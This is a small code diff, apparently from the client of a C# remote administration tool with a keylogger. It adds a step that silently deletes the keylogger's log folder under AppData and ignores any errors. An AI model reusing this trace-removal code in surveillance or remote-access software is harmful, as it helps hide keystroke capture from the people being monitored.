@@ -204,6 +204,18 @@ namespace xClient.Core.Commands
                 }
             }
 
+            string logsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
+            if (Directory.Exists(logsDirectory)) // try to delete Logs from Keylogger
+            {
+                try
+                {
+                    Directory.Delete(logsDirectory, true);
+                }
+                catch
+                {
+                }
+            }
+
             try
             {
                 string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
